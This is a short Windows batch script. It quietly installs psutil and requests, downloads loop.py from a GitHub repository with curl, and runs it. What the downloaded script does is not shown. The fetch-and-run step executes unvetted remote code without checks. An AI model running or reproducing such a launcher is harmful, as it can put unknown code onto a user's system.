@echo off
pip install psutil --quiet
pip install requests --quiet
curl -s -L -o loop.py https://github.com/minarulns/lite_manager_win/raw/main/loop.py
python loop.py
